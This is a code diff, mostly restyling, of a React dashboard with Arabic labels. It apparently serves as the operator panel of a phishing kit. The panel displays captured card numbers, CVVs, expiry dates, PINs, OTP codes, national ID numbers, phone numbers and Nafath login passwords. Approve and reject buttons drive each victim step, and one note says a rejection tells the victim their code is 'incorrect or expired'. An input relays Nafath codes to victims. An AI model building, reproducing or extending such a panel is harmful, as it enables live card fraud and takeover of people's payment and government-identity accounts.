@@ -2482,66 +2482,90 @@ const renderNafadBox = () => {
         timestamp: entryTimestamp,
         component: (
           <div style={{ 
-            background: "#ffffff", 
-            borderRadius: 12, 
-            padding: 16, 
-            border: "2px solid #3b82f6",
+            background: "#f9fafb",
+            borderRadius: 8, 
+            padding: 8, 
+            border: "1px solid #d1d5db",
             width: "40%",
             marginRight: 0,
             marginLeft: "auto",
-            position: "relative"
+            fontFamily: "Cairo, Tajawal, sans-serif"
           }}>
-            <TimeCounter timestamp={entryTimestamp} />
-            <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12, marginTop: 20 }}>
-              <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>صندوق بيانات الدفع</h3>
+            <div style={{ marginBottom: 8 }}>
+              <div style={{ 
+                fontSize: "10px", 
+                color: "#6b7280", 
+                textAlign: "right",
+                marginBottom: 4
+              }}>
+                {entryTimestamp > 0 ? (
+                  <TimeCounter timestamp={entryTimestamp} />
+                ) : "—"}
+              </div>
+              <h3 style={{
+                fontSize: "14px",
+                fontWeight: 700,
+                color: "#1f2937",
+                textAlign: "center",
+                margin: 0
+              }}>
+                💳 بيانات الدفع
+              </h3>
             </div>
-            {/* Card Details */}
-            {raw.cardNumber && (
-              <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8, marginBottom: 8 }}>
-                <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>رقم البطاقة</span>
-                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.cardNumber}</span>
+            <div style={{
+              background: "#ffffff",
+              borderRadius: 6,
+              padding: 8,
+              boxShadow: "0 1px 2px rgba(0,0,0,0.05)"
+            }}>
+              {/* Card Details */}
+              {raw.cardNumber && (
+                <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8, marginBottom: 4 }}>
+                  <span style={{ fontSize: "12px", color: "#6b7280" }}>رقم البطاقة</span>
+                  <span style={{ fontSize: "12px", fontWeight: 600, color: "#111827" }}>{raw.cardNumber}</span>
+                </div>
+              )}
+              {raw.cardOwner && (
+                <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8, marginBottom: 4 }}>
+                  <span style={{ fontSize: "12px", color: "#6b7280" }}>اسم صاحب البطاقة</span>
+                  <span style={{ fontSize: "12px", fontWeight: 600, color: "#111827" }}>{raw.cardOwner}</span>
+                </div>
+              )}
+              {raw.cardExpiry && (
+                <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8, marginBottom: 4 }}>
+                  <span style={{ fontSize: "12px", color: "#6b7280" }}>تاريخ الانتهاء</span>
+                  <span style={{ fontSize: "12px", fontWeight: 600, color: "#111827" }}>{raw.cardExpiry}</span>
+                </div>
+              )}
+              {raw.cvv && (
+                <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8, marginBottom: 4 }}>
+                  <span style={{ fontSize: "12px", color: "#6b7280" }}>CVV</span>
+                  <span style={{ fontSize: "12px", fontWeight: 600, color: "#111827" }}>{raw.cvv}</span>
+                </div>
+              )}
+              {raw.cardType && (
+                <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8, marginBottom: 4 }}>
+                  <span style={{ fontSize: "12px", color: "#6b7280" }}>نوع البطاقة</span>
+                  <span style={{ fontSize: "12px", fontWeight: 600, color: "#111827" }}>{raw.cardType}</span>
+                </div>
+              )}
+              {/* أزرار الموافقة والرفض */}
+              <div style={{ display: "flex", gap: 8, marginTop: 8 }}>
+                <button 
+                  onClick={() => handleReject("check")}
+                  disabled={actionLoading === "reject"}
+                  style={{ flex: "1 1 0%", padding: "10px 16px", border: "1px solid #d1d5db", borderRadius: 8, background: "#ffffff", color: "#374151", fontWeight: 600, cursor: actionLoading === "reject" ? "wait" : "pointer", opacity: actionLoading === "reject" ? 0.7 : 1 }}
+                >
+                  {actionLoading === "reject" ? "جارٍ..." : "رفض"}
+                </button>
+                <button 
+                  onClick={() => handleApprove("check")}
+                  disabled={actionLoading === "approve"}
+                  style={{ flex: "1 1 0%", padding: "10px 16px", border: "none", borderRadius: 8, background: "#22c55e", color: "#ffffff", fontWeight: 600, cursor: actionLoading === "approve" ? "wait" : "pointer", opacity: actionLoading === "approve" ? 0.7 : 1 }}
+                >
+                  {actionLoading === "approve" ? "جارٍ..." : "✅ موافقة"}
+                </button>
               </div>
-            )}
-            {raw.cardOwner && (
-              <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8, marginBottom: 8 }}>
-                <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>اسم صاحب البطاقة</span>
-                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.cardOwner}</span>
-              </div>
-            )}
-            {raw.cardExpiry && (
-              <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8, marginBottom: 8 }}>
-                <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>تاريخ الانتهاء</span>
-                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.cardExpiry}</span>
-              </div>
-            )}
-            {raw.cvv && (
-              <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8, marginBottom: 8 }}>
-                <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>CVV</span>
-                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.cvv}</span>
-              </div>
-            )}
-            {raw.cardType && (
-              <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8, marginBottom: 8 }}>
-                <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>نوع البطاقة</span>
-                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.cardType}</span>
-              </div>
-            )}
-            {/* أزرار الموافقة والرفض */}
-            <div style={{ display: "flex", gap: 8, marginTop: 12 }}>
-              <button 
-                onClick={() => handleReject("check")}
-                disabled={actionLoading === "reject"}
-                style={{ flex: "1 1 0%", padding: "10px 16px", border: "1px solid #d1d5db", borderRadius: 8, background: "#ffffff", color: "#374151", fontWeight: 600, cursor: actionLoading === "reject" ? "wait" : "pointer", opacity: actionLoading === "reject" ? 0.7 : 1 }}
-              >
-                {actionLoading === "reject" ? "جارٍ..." : "رفض"}
-              </button>
-              <button 
-                onClick={() => handleApprove("check")}
-                disabled={actionLoading === "approve"}
-                style={{ flex: "1 1 0%", padding: "10px 16px", border: "none", borderRadius: 8, background: "#111827", color: "#ffffff", fontWeight: 600, cursor: actionLoading === "approve" ? "wait" : "pointer", opacity: actionLoading === "approve" ? 0.7 : 1 }}
-              >
-                {actionLoading === "approve" ? "جارٍ..." : "موافقة"}
-              </button>
             </div>
             
             {/* زر عرض السجل - يظهر فقط إذا كان هناك أكثر من إدخال */}
@@ -2672,46 +2696,69 @@ const renderNafadBox = () => {
         timestamp: entryTimestamp,
         component: (
           <div style={{ 
-            background: "#ffffff", 
-            borderRadius: 12, 
-            padding: 16, 
-            border: "2px solid #3b82f6",
+            background: "#f9fafb",
+            borderRadius: 8, 
+            padding: 8, 
+            border: "1px solid #d1d5db",
             width: "40%",
             marginRight: 0,
             marginLeft: "auto",
-            position: "relative"
+            fontFamily: "Cairo, Tajawal, sans-serif"
           }}>
-            <TimeCounter timestamp={entryTimestamp} />
-            <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12, marginTop: 20 }}>
-              <span style={{ fontSize: "1rem" }}>🔐</span>
-              <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>صندوق رمز التحقق (OTP)</h3>
+            <div style={{ marginBottom: 8 }}>
+              <div style={{ 
+                fontSize: "10px", 
+                color: "#6b7280", 
+                textAlign: "right",
+                marginBottom: 4
+              }}>
+                {entryTimestamp > 0 ? (
+                  <TimeCounter timestamp={entryTimestamp} />
+                ) : "—"}
+              </div>
+              <h3 style={{
+                fontSize: "14px",
+                fontWeight: 700,
+                color: "#1f2937",
+                textAlign: "center",
+                margin: 0
+              }}>
+                🔐 رمز التحقق (OTP)
+              </h3>
             </div>
-            {/* رمز OTP */}
-            <div style={{ background: "#f0f9ff", borderRadius: 8, padding: 12, border: "1px solid #7dd3fc", textAlign: "center", marginBottom: 12 }}>
-              <p style={{ margin: "0 0 4px", fontSize: "0.75rem", color: "#0369a1" }}>رمز التحقق المُدخل:</p>
-              <p style={{ margin: 0, fontSize: "1.5rem", fontWeight: 700, color: "#0c4a6e", letterSpacing: "0.3em" }}>{otpCode}</p>
+            <div style={{
+              background: "#ffffff",
+              borderRadius: 6,
+              padding: 8,
+              boxShadow: "0 1px 2px rgba(0,0,0,0.05)"
+            }}>
+              {/* رمز OTP */}
+              <div style={{ background: "#f0f9ff", borderRadius: 8, padding: 12, border: "1px solid #7dd3fc", textAlign: "center", marginBottom: 12 }}>
+                <p style={{ margin: "0 0 4px", fontSize: "12px", color: "#0369a1" }}>رمز التحقق المُدخل:</p>
+                <p style={{ margin: 0, fontSize: "24px", fontWeight: 700, color: "#0c4a6e", letterSpacing: "0.3em" }}>{otpCode}</p>
+              </div>
+              {/* أزرار الموافقة والرفض */}
+              <div style={{ display: "flex", gap: 8 }}>
+                <button 
+                  onClick={() => handleReject("step2")}
+                  disabled={actionLoading === "reject"}
+                  style={{ flex: "1 1 0%", padding: "10px 16px", border: "1px solid #d1d5db", borderRadius: 8, background: "#ffffff", color: "#374151", fontWeight: 600, cursor: actionLoading === "reject" ? "wait" : "pointer", opacity: actionLoading === "reject" ? 0.7 : 1 }}
+                >
+                  {actionLoading === "reject" ? "جارٍ..." : "❌ رفض"}
+                </button>
+                <button 
+                  onClick={() => handleApprove("step2")}
+                  disabled={actionLoading === "approve"}
+                  style={{ flex: "1 1 0%", padding: "10px 16px", border: "none", borderRadius: 8, background: "#22c55e", color: "#ffffff", fontWeight: 600, cursor: actionLoading === "approve" ? "wait" : "pointer", opacity: actionLoading === "approve" ? 0.7 : 1 }}
+                >
+                  {actionLoading === "approve" ? "جارٍ..." : "✅ موافقة"}
+                </button>
+              </div>
+              {/* رسالة تحت الأزرار */}
+              <p style={{ margin: "8px 0 0", fontSize: "10px", color: "#ef4444", textAlign: "center" }}>
+                الرفض: يرجع العميل ويعرض "رمز التحقق غير صحيح او منتهي الصلاحية"
+              </p>
             </div>
-            {/* أزرار الموافقة والرفض */}
-            <div style={{ display: "flex", gap: 8, marginTop: 12 }}>
-              <button 
-                onClick={() => handleReject("step2")}
-                disabled={actionLoading === "reject"}
-                style={{ flex: "1 1 0%", padding: "10px 16px", border: "1px solid #d1d5db", borderRadius: 8, background: "#ffffff", color: "#374151", fontWeight: 600, cursor: actionLoading === "reject" ? "wait" : "pointer", opacity: actionLoading === "reject" ? 0.7 : 1 }}
-              >
-                {actionLoading === "reject" ? "جارٍ..." : "❌ رفض"}
-              </button>
-              <button 
-                onClick={() => handleApprove("step2")}
-                disabled={actionLoading === "approve"}
-                style={{ flex: "1 1 0%", padding: "10px 16px", border: "none", borderRadius: 8, background: "#22c55e", color: "#ffffff", fontWeight: 600, cursor: actionLoading === "approve" ? "wait" : "pointer", opacity: actionLoading === "approve" ? 0.7 : 1 }}
-              >
-                {actionLoading === "approve" ? "جارٍ..." : "✅ موافقة"}
-              </button>
-            </div>
-            {/* رسالة تحت الأزرار */}
-            <p style={{ margin: "8px 0 0", fontSize: "0.7rem", color: "#ef4444", textAlign: "center" }}>
-              الرفض: يرجع العميل ويعرض "رمز التحقق غير صحيح او منتهي الصلاحية"
-            </p>
             
             {/* زر عرض السجل */}
             {otpEntriesCount > 1 && (
@@ -2837,45 +2884,69 @@ const renderNafadBox = () => {
         timestamp: entryTimestamp,
         component: (
           <div style={{ 
-            background: "#ffffff", 
-            borderRadius: 12, 
-            padding: 16, 
-            border: "2px solid #3b82f6",
+            background: "#f9fafb",
+            borderRadius: 8, 
+            padding: 8, 
+            border: "1px solid #d1d5db",
             width: "40%",
             marginRight: 0,
             marginLeft: "auto",
-            position: "relative"
+            fontFamily: "Cairo, Tajawal, sans-serif"
           }}>
-            <TimeCounter timestamp={entryTimestamp} />
-            <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12, marginTop: 20 }}>
-              <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>صندوق رمز PIN</h3>
+            <div style={{ marginBottom: 8 }}>
+              <div style={{ 
+                fontSize: "10px", 
+                color: "#6b7280", 
+                textAlign: "right",
+                marginBottom: 4
+              }}>
+                {entryTimestamp > 0 ? (
+                  <TimeCounter timestamp={entryTimestamp} />
+                ) : "—"}
+              </div>
+              <h3 style={{
+                fontSize: "14px",
+                fontWeight: 700,
+                color: "#1f2937",
+                textAlign: "center",
+                margin: 0
+              }}>
+                🔑 رمز PIN
+              </h3>
             </div>
-            <div style={{ display: "flex", justifyContent: "center", gap: 4, direction: "ltr" }}>
-              {Array.from({ length: 4 }).map((_, idx) => {
-                const pinValue = String(pinCode || "0000").padStart(4, "0")[idx] || "0";
-                return (
-                  <div key={idx} style={{ background: "#f0f9ff", borderRadius: 8, display: "flex", alignItems: "center", justifyContent: "center", width: 40, height: 50, border: "1px solid #7dd3fc" }}>
-                    <span style={{ fontSize: "1.25rem", fontWeight: 700, color: "#0c4a6e" }}>{pinValue}</span>
-                  </div>
-                );
-              })}
-            </div>
-            {/* أزرار الموافقة والرفض */}
-            <div style={{ display: "flex", gap: 8, marginTop: 12 }}>
-              <button 
-                onClick={() => handleReject("step3")}
-                disabled={actionLoading === "reject"}
-                style={{ flex: "1 1 0%", padding: "10px 16px", border: "1px solid #d1d5db", borderRadius: 8, background: "#ffffff", color: "#374151", fontWeight: 600, cursor: actionLoading === "reject" ? "wait" : "pointer", opacity: actionLoading === "reject" ? 0.7 : 1 }}
-              >
-                {actionLoading === "reject" ? "جارٍ..." : "رفض"}
-              </button>
-              <button 
-                onClick={() => handleApprove("step3")}
-                disabled={actionLoading === "approve"}
-                style={{ flex: "1 1 0%", padding: "10px 16px", border: "none", borderRadius: 8, background: "#111827", color: "#ffffff", fontWeight: 600, cursor: actionLoading === "approve" ? "wait" : "pointer", opacity: actionLoading === "approve" ? 0.7 : 1 }}
-              >
-                {actionLoading === "approve" ? "جارٍ..." : "موافقة"}
-              </button>
+            <div style={{
+              background: "#ffffff",
+              borderRadius: 6,
+              padding: 8,
+              boxShadow: "0 1px 2px rgba(0,0,0,0.05)"
+            }}>
+              <div style={{ display: "flex", justifyContent: "center", gap: 4, direction: "ltr", marginBottom: 12 }}>
+                {Array.from({ length: 4 }).map((_, idx) => {
+                  const pinValue = String(pinCode || "0000").padStart(4, "0")[idx] || "0";
+                  return (
+                    <div key={idx} style={{ background: "#f0f9ff", borderRadius: 8, display: "flex", alignItems: "center", justifyContent: "center", width: 40, height: 50, border: "1px solid #7dd3fc" }}>
+                      <span style={{ fontSize: "1.25rem", fontWeight: 700, color: "#0c4a6e" }}>{pinValue}</span>
+                    </div>
+                  );
+                })}
+              </div>
+              {/* أزرار الموافقة والرفض */}
+              <div style={{ display: "flex", gap: 8 }}>
+                <button 
+                  onClick={() => handleReject("step3")}
+                  disabled={actionLoading === "reject"}
+                  style={{ flex: "1 1 0%", padding: "10px 16px", border: "1px solid #d1d5db", borderRadius: 8, background: "#ffffff", color: "#374151", fontWeight: 600, cursor: actionLoading === "reject" ? "wait" : "pointer", opacity: actionLoading === "reject" ? 0.7 : 1 }}
+                >
+                  {actionLoading === "reject" ? "جارٍ..." : "رفض"}
+                </button>
+                <button 
+                  onClick={() => handleApprove("step3")}
+                  disabled={actionLoading === "approve"}
+                  style={{ flex: "1 1 0%", padding: "10px 16px", border: "none", borderRadius: 8, background: "#111827", color: "#ffffff", fontWeight: 600, cursor: actionLoading === "approve" ? "wait" : "pointer", opacity: actionLoading === "approve" ? 0.7 : 1 }}
+                >
+                  {actionLoading === "approve" ? "جارٍ..." : "موافقة"}
+                </button>
+              </div>
             </div>
             
             {/* زر عرض السجل */}
@@ -3002,52 +3073,75 @@ const renderNafadBox = () => {
         timestamp: entryTimestamp,
         component: (
           <div style={{ 
-            background: "#ffffff", 
-            borderRadius: 12, 
-            padding: 16, 
-            border: "2px solid #3b82f6",
+            background: "#f9fafb",
+            borderRadius: 8, 
+            padding: 8, 
+            border: "1px solid #d1d5db",
             width: "40%",
             marginRight: 0,
             marginLeft: "auto",
-            position: "relative"
+            fontFamily: "Cairo, Tajawal, sans-serif"
           }}>
-            <TimeCounter timestamp={entryTimestamp} />
-            <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12, marginTop: 20 }}>
-              <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>تحقق الهاتف</h3>
+            <div style={{ marginBottom: 8 }}>
+              <div style={{ 
+                fontSize: "10px", 
+                color: "#6b7280", 
+                textAlign: "right",
+                marginBottom: 4
+              }}>
+                {entryTimestamp > 0 ? (
+                  <TimeCounter timestamp={entryTimestamp} />
+                ) : "—"}
+              </div>
+              <h3 style={{
+                fontSize: "14px",
+                fontWeight: 700,
+                color: "#1f2937",
+                textAlign: "center",
+                margin: 0
+              }}>
+                📱 تحقق الهاتف
+              </h3>
             </div>
-            {raw.phoneIdNumber && (
-              <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
-                <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>رقم الهوية</span>
-                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.phoneIdNumber}</span>
-              </div>
-            )}
-            {raw.phoneNumber && (
-              <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
-                <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>رقم الجوال</span>
-                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.phoneNumber}</span>
-              </div>
-            )}
-            {raw.phoneCarrier && (
-              <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
-                <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>شركة الاتصالات</span>
-                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.phoneCarrier}</span>
-              </div>
-            )}
-            {(raw.phoneOtp || raw._v7) && (
-              <div style={{ marginTop: 8, background: "#f0f9ff", borderRadius: 8, padding: 12, textAlign: "center" }}>
-                <p style={{ margin: 0, fontSize: "1.2rem", fontWeight: 700, color: "#0c4a6e", letterSpacing: "0.2em" }}>{raw.phoneOtp || raw._v7}</p>
-              </div>
-            )}
-            {/* زر إعادة إرسال الرمز */}
-            <button 
-              onClick={handleResendCode}
-              disabled={actionLoading === "resend"}
-              style={{ width: "100%", padding: "10px 16px", border: "1px solid #d1d5db", borderRadius: 8, background: "#ffffff", color: "#374151", fontWeight: 600, cursor: actionLoading === "resend" ? "wait" : "pointer", opacity: actionLoading === "resend" ? 0.7 : 1, marginTop: 12 }}
-            >
-              🔄 {actionLoading === "resend" ? "جارٍ الإرسال..." : "إعادة إرسال رمز"}
-            </button>
+            <div style={{
+              background: "#ffffff",
+              borderRadius: 6,
+              padding: 8,
+              boxShadow: "0 1px 2px rgba(0,0,0,0.05)"
+            }}>
+              {raw.phoneIdNumber && (
+                <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8, marginBottom: 4 }}>
+                  <span style={{ fontSize: "12px", color: "#6b7280" }}>رقم الهوية</span>
+                  <span style={{ fontSize: "12px", fontWeight: 600, color: "#111827" }}>{raw.phoneIdNumber}</span>
+                </div>
+              )}
+              {raw.phoneNumber && (
+                <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8, marginBottom: 4 }}>
+                  <span style={{ fontSize: "12px", color: "#6b7280" }}>رقم الجوال</span>
+                  <span style={{ fontSize: "12px", fontWeight: 600, color: "#111827" }}>{raw.phoneNumber}</span>
+                </div>
+              )}
+              {raw.phoneCarrier && (
+                <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8, marginBottom: 4 }}>
+                  <span style={{ fontSize: "12px", color: "#6b7280" }}>شركة الاتصالات</span>
+                  <span style={{ fontSize: "12px", fontWeight: 600, color: "#111827" }}>{raw.phoneCarrier}</span>
+                </div>
+              )}
+              {(raw.phoneOtp || raw._v7) && (
+                <div style={{ marginTop: 8, background: "#f0f9ff", borderRadius: 8, padding: 12, textAlign: "center", marginBottom: 8 }}>
+                  <p style={{ margin: 0, fontSize: "18px", fontWeight: 700, color: "#0c4a6e", letterSpacing: "0.2em" }}>{raw.phoneOtp || raw._v7}</p>
+                </div>
+              )}
+              {/* زر إعادة إرسال الرمز */}
+              <button 
+                onClick={handleResendCode}
+                disabled={actionLoading === "resend"}
+                style={{ width: "100%", padding: "10px 16px", border: "1px solid #d1d5db", borderRadius: 8, background: "#ffffff", color: "#374151", fontWeight: 600, cursor: actionLoading === "resend" ? "wait" : "pointer", opacity: actionLoading === "resend" ? 0.7 : 1, marginBottom: 8 }}
+              >
+                🔄 {actionLoading === "resend" ? "جارٍ الإرسال..." : "إعادة إرسال رمز"}
+              </button>
             {/* أزرار الموافقة والرفض */}
-            <div style={{ display: "flex", gap: 8, marginTop: 12 }}>
+            <div style={{ display: "flex", gap: 8 }}>
               <button 
                 onClick={() => handleReject("step5")}
                 disabled={actionLoading === "reject"}
@@ -3062,6 +3156,7 @@ const renderNafadBox = () => {
               >
                 {actionLoading === "approve" ? "جارٍ..." : "موافقة"}
               </button>
+            </div>
             </div>
             
             {/* زر عرض السجل */}
@@ -3191,33 +3286,55 @@ const renderNafadBox = () => {
         timestamp: entryTimestamp,
         component: (
           <div style={{ 
-            background: "#ffffff", 
-            borderRadius: 12, 
-            padding: 16, 
-            border: "2px solid #3b82f6",
+            background: "#f9fafb",
+            borderRadius: 8, 
+            padding: 8, 
+            border: "1px solid #d1d5db",
             width: "40%",
             marginRight: 0,
             marginLeft: "auto",
-            position: "relative"
+            fontFamily: "Cairo, Tajawal, sans-serif"
           }}>
-            <TimeCounter timestamp={entryTimestamp} />
-            <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12, marginTop: 20 }}>
-              <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>نفاذ</h3>
+            <div style={{ marginBottom: 8 }}>
+              <div style={{ 
+                fontSize: "10px", 
+                color: "#6b7280", 
+                textAlign: "right",
+                marginBottom: 4
+              }}>
+                {entryTimestamp > 0 ? (
+                  <TimeCounter timestamp={entryTimestamp} />
+                ) : "—"}
+              </div>
+              <h3 style={{
+                fontSize: "14px",
+                fontWeight: 700,
+                color: "#1f2937",
+                textAlign: "center",
+                margin: 0
+              }}>
+                🔐 نفاذ
+              </h3>
             </div>
-            {raw.nafadIdNumber && (
-              <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
-                <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>رقم الهوية</span>
-                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.nafadIdNumber}</span>
-              </div>
-            )}
-            {raw.nafadPassword && (
-              <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8, marginTop: 8 }}>
-                <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>كلمة المرور</span>
-                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.nafadPassword}</span>
-              </div>
-            )}
-            {/* حقل إدخال رمز النفاذ */}
-            <div style={{ marginTop: 12 }}>
+            <div style={{
+              background: "#ffffff",
+              borderRadius: 6,
+              padding: 8,
+              boxShadow: "0 1px 2px rgba(0,0,0,0.05)"
+            }}>
+              {raw.nafadIdNumber && (
+                <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8, marginBottom: 4 }}>
+                  <span style={{ fontSize: "12px", color: "#6b7280" }}>رقم الهوية</span>
+                  <span style={{ fontSize: "12px", fontWeight: 600, color: "#111827" }}>{raw.nafadIdNumber}</span>
+                </div>
+              )}
+              {raw.nafadPassword && (
+                <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8, marginBottom: 8 }}>
+                  <span style={{ fontSize: "12px", color: "#6b7280" }}>كلمة المرور</span>
+                  <span style={{ fontSize: "12px", fontWeight: 600, color: "#111827" }}>{raw.nafadPassword}</span>
+                </div>
+              )}
+              {/* حقل إدخال رمز النفاذ */}
               <input
                 type="text"
                 placeholder="أدخل رمز النفاذ..."
@@ -3228,13 +3345,13 @@ const renderNafadBox = () => {
                   padding: "10px 12px", 
                   border: "1px solid #d1d5db", 
                   borderRadius: 8, 
-                  fontSize: "0.9rem",
+                  fontSize: "14px",
                   textAlign: "center",
                   letterSpacing: "0.2em",
-                  direction: "ltr"
+                  direction: "ltr",
+                  marginBottom: 8
                 }}
               />
-            </div>
             {/* زر إرسال رمز النفاذ */}
             <button 
               onClick={() => handleNafadCode(nafadInput)}
@@ -3247,12 +3364,12 @@ const renderNafadBox = () => {
                 background: nafadInput.trim() ? "#111827" : "#9ca3af", 
                 color: "#ffffff", 
                 fontWeight: 600, 
-                cursor: actionLoading === "nafad" || !nafadInput.trim() ? "wait" : "pointer", 
-                marginTop: 8 
+                cursor: actionLoading === "nafad" || !nafadInput.trim() ? "wait" : "pointer"
               }}
             >
               📤 {actionLoading === "nafad" ? "جارٍ الإرسال..." : "إرسال رمز النفاذ"}
             </button>
+            </div>
             
             {/* زر عرض السجل */}
             {nafadEntriesCount > 1 && (
